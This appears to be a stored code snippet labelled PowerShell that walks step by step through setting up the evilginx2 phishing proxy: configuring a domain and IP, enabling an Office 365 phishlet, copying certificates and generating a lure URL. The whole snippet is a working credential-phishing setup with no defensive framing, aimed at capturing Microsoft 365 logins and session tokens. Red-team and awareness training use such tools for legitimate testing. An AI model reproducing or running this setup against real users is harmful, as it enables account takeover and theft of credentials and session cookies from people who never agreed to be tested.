---
id: ba9cec9d-5e19-4302-9846-e263cd018b23
type: code
language: Powershell
verified: false
created_at: '2023-05-23T21:57:33.561579+00:00'
updated_at: '2023-05-24T03:35:02.230111+00:00'
---

# Code Snippet ba9cec9d

**Language**: Powershell

```powershell
PS C:\Tools> evilginx2 -p C:\Tools\evilginx2\phishlets

# Configure Domain and IP
: config domain username.corp
: config ip 10.10.10.10

# Configure O365 Phishlet
: phishlets hostname o365 login.username.corp
: phishlets get-hosts o365

# Create a DNS entry for login.login.username.corp and www.login.username.corp, type A, pointing to your machine

# copy certificate and enable the phishing
PS C:\Tools> Copy-Item C:\Users\Username\.evilginx\crt\ca.crt C:\Users\Username\.evilginx\crt\login.username.corp\o365.crt
PS C:\Tools> Copy-Item C:\Users\Username\.evilginx\crt\private.key C:\Users\Username\.evilginx\crt\login.username.corp\o365.key

# Enable O365 Phishlet
: phishlets enable o365

# get the phishing URL
: lures create o365
: lures get-url 0
```
